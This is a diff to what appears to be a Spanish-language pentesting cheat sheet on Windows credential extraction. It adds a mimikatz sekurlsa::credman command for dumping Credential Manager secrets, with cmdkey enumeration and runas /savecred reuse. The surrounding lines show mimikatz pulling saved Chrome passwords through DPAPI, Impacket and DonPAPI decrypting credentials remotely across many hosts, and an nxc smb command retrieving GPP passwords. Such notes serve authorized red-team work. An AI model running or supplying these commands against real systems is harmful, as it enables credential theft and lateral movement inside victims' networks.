@@ -121,6 +121,9 @@ Copia de la base desde el propio DC, cuando ya hay ejecución ahí. No usa repli
 `mimikatz # dpapi::chrome /in:"...\Google\Chrome\User Data\Default\Login Data" /unprotect`
 Contraseñas guardadas del navegador. La masterkey DPAPI sale del volcado de LSASS/SECURITY.
 
+`mimikatz # sekurlsa::credman`
+Credenciales del Credential Manager de las sesiones activas (OneDrive, shares, usuarios de dominio). Enum con `cmdkey /list`, reuso con `runas /savecred` sin crackear, y extracción completa en [[Credential Manager de Windows - matriz de referencia]].
+
 `dpapi.py` (Impacket) descifra blobs y credenciales con la masterkey, sin tocar Windows. `DonPAPI` lo hace **remoto y en masa** contra varios hosts.
 
 `nxc smb 10.0.0.20 -u admin -p 'pass' -M gpp_password`
